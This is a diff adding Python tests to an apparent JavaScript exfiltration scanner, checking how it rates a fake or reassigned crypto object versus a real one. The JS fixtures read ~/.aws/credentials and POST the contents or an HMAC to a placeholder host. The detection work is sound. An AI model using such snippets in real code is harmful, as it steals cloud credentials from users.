@@ -671,3 +671,41 @@ def test_crypto_sign_and_verify_on_the_binding_are_reducers():
             f"fetch('https://{_HOST}/', {{method: 'POST', body: {expr}}});\n"
         )
         assert _flow_rules(src) == {"JS_SECRET_FILE_FLOW": "warn"}, expr
+
+
+# --------------------------------------------------------------------------- #
+# Round 2 addendum 4: `crypto` is never trusted by name.                        #
+# --------------------------------------------------------------------------- #
+_SIGV4_BODY = (
+    "const data = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');\n"
+    f"fetch('https://{_HOST}/', {{method: 'POST', body: crypto.createHmac('sha256', data)"
+    ".update('m').digest('hex')}});\n"
+)
+
+
+def test_a_user_defined_crypto_object_stays_crit():
+    fake = _FS + "const os = require('os');\n" + (
+        "const crypto = { createHmac: (a, k) => ({ update: (d) => ({ digest: () => k }) }) };\n"
+    ) + _SIGV4_BODY
+    reassigned = _FS + "const os = require('os');\n" + (
+        "crypto = { createHmac: (a, k) => ({ update: () => ({ digest: () => k }) }) };\n"
+    ) + _SIGV4_BODY
+    as_param = _FS + "const os = require('os');\n" + (
+        "function go(crypto) {\n"
+    ) + _SIGV4_BODY + "}\n"
+    for src in (fake, reassigned, as_param):
+        assert _flow_rules(src) == {"JS_CRED_EXFIL_FLOW": "crit"}, src
+
+
+def test_a_real_crypto_binding_or_untouched_global_is_a_reducer():
+    required = _FS + "const os = require('os');\nconst crypto = require('crypto');\n" + _SIGV4_BODY
+    imported = (
+        "import fs from 'fs';\nimport os from 'os';\nimport crypto from 'node:crypto';\n"
+        + _SIGV4_BODY
+    )
+    aliased = _FS + "const os = require('os');\nconst c = require('node:crypto');\n" + (
+        _SIGV4_BODY.replace("crypto.createHmac", "c.createHmac")
+    )
+    untouched_global = _FS + "const os = require('os');\n" + _SIGV4_BODY
+    for src in (required, imported, aliased, untouched_global):
+        assert _flow_rules(src) == {"JS_SECRET_FILE_FLOW": "warn"}, src
